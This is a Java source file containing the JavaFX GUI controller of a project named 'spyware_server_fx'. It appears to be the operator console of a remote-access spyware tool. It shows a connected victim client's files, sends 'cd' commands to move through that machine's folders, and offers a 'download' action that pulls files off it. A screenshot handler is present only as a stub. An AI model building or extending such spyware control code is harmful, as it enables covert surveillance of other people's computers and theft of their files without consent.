package com.example.spyware_server_fx;

import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.*;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.FlowPane;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.scene.paint.Color;
import javafx.scene.shape.Rectangle;

import java.io.File;
import java.net.URL;
import java.util.ArrayList;
import java.util.ResourceBundle;

public class GuiController {

    @FXML
    private ScrollPane scrollPane;
    @FXML
    private FlowPane flowPane;
    @FXML
    private ImageView go_back_btn;
    public Image go_back_default_image;
    public Image go_back_hover_image;
    public Image go_back_pressed_image;

    @FXML
    private ImageView reload_btn;
    public Image reload_default_image;
    public Image reload_hover_image;
    public Image reload_pressed_image;
    public Image file_img;
    public Image folder_img;
    public final static String iconsBasePath = "src/main/java/com/example/spyware_server_fx/icons/";
    public final static String resourcesIconsBasePath = "src/main/resources/com/example/spyware_server_fx/icons/";
    public ArrayList<VBox> vBoxes = new ArrayList<>();

    public HelloController helloController;
    public GuiController(HelloController helloController){

        this.helloController = helloController;

        reload_default_image = getIconImage(resourcesIconsBasePath+"reload.png");
        reload_hover_image = getIconImage(resourcesIconsBasePath+"reload_hover.png");
        reload_pressed_image = getIconImage(resourcesIconsBasePath+"reload_pressed.png");

        go_back_default_image = getIconImage(resourcesIconsBasePath+"go_back.png");
        go_back_hover_image = getIconImage(resourcesIconsBasePath+"go_back_hover.png");
        go_back_pressed_image = getIconImage(resourcesIconsBasePath+"go_back_pressed.png");

    }

    @FXML
    void takeScreenShot(ActionEvent event) {
        System.out.println("Taking screenshot");

    }
    @FXML
    void on_go_back_btn_mouse_entered(MouseEvent event) {
        go_back_btn.setImage(go_back_hover_image);
    }

    @FXML
    void on_go_back_btn_mouse_exited(MouseEvent event) {
        go_back_btn.setImage(go_back_default_image);
    }

    @FXML
    void on_go_back_btn_mouse_pressed(MouseEvent event) {
        go_back_btn.setImage(go_back_pressed_image);
    }

    @FXML
    void on_go_back_btn_mouse_released(MouseEvent event) {
        go_back_btn.setImage(go_back_default_image);

        helloController.cmd_controller.sendCmd("cd .." , null);
    }
    @FXML
    void on_reload_btn_mouse_entered(MouseEvent event) {
        System.out.println("Mouse entered on reloadBtn");
        reload_btn.setImage(reload_hover_image);
    }

    @FXML
    void on_reload_btn_mouse_exited(MouseEvent event) {
        System.out.println("mouse exited from reload btn");
        reload_btn.setImage(reload_default_image);
    }
    @FXML
    void on_reload_btn_mouse_pressed(MouseEvent event) {
        System.out.println("mouse pressed on reload btn");
        reload_btn.setImage(reload_pressed_image);
    }

    @FXML
    void on_reload_btn_mouse_released(MouseEvent event) {
        System.out.println("mouse released on reload btn");
        reload_btn.setImage(reload_default_image);

        getAndShowData();
    }


    enum FileType{
        FOLDER,
        FILE
    }

    void showData(ArrayList<File> filesList){
        flowPane.getChildren().clear();
        System.out.println("Showing data");
        FileType type = null;
        for (File file : filesList) {
            String iconPath = iconsBasePath;
            if (file.isFile()) {
//                System.out.println("File: " + file.getName());
                iconPath +="file_50x50.png";
                type = FileType.FILE;
            } else if (file.isDirectory()) {
//                System.out.println("Folder: " + file.getName());
                iconPath += "folder_50x50.png";
                type = FileType.FOLDER;
            }
            VBox labelledIcon = getLabelledIcon(iconPath , file , type);
            flowPane.getChildren().add(labelledIcon);
        }

    }

    public void getAndShowData(){
        if(helloController.server.clientSocket != null && helloController.server.clientSocket.isConnected()) {
            Thread reloadDataThread = new Thread(new Runnable() {
                public void run() {
                    ArrayList<File> filesList =  helloController.server.getFilesList();
                    Platform.runLater(new Runnable() {
                        @Override
                        public void run() {
                            showData(filesList);
                        }
                    });
                }
            });
            reloadDataThread.start();
        }
    }
    public static Image getIconImage(String iconPath){
        File file = new File(iconPath);
        Image image = new Image(file.toURI().toString());
        System.out.println(file.toURI().toString());
        return image;
    }
    public ImageView getIcon(String iconPath){
        Image image = getIconImage(iconPath);
        // Create an ImageView object
        ImageView imageView = new ImageView(image);
//        imageView.setFitHeight(50);
//        imageView.setFitHeight(50);

        return imageView;
    }
    public VBox getLabelledIcon(String iconPath , File file , FileType type){
        ImageView imageView = getIcon(iconPath);
        // adding context menu
        imageView = imageAttachContextMenu(imageView , file , type);

        // Create a label for the image
        Label label = new Label(file.getName());
        label.setPrefWidth(50);
        Tooltip tooltip = new Tooltip(label.getText());
        Tooltip.install(imageView,tooltip);
        label.setTooltip(tooltip);
        // Create the VBox and add the Label nodes to it
        VBox vbox = new VBox(imageView , label);

        vbox.setOnMouseClicked(e -> {
            // removes previous selected background colors
            for(VBox vBox : vBoxes){
                vBox.setStyle("");
            }

            vbox.setStyle("-fx-background-color: lightblue"); // Set background color to blue

            if(e.getClickCount() > 1){
                helloController.cmd_controller.sendCmd("cd "+file.getName() , null);
            }
        });

        vBoxes.add(vbox);

        return vbox;
    }

    public ImageView imageAttachContextMenu(ImageView imageView,File file, FileType type){
        ContextMenu contextMenu = new ContextMenu();

        // Create a MenuItem object and add it to the ContextMenu
        if(type == FileType.FILE)
        {
            MenuItem menuItem = new MenuItem("download");
            menuItem.setOnAction(e -> {
                helloController.cmd_controller.sendCmd("download "+ file.getName() , null);
            });
            contextMenu.getItems().add(menuItem);
        }
        else {
            for (int i = 0; i < 5; i++) {
                MenuItem menuItem = new MenuItem("Do something");
                contextMenu.getItems().add(menuItem);
            }
        }

        // Attach the ContextMenu to the ImageView
        imageView.setOnContextMenuRequested(event -> {
            contextMenu.show(imageView, event.getScreenX(), event.getScreenY());
        });
        return imageView;
    }
}
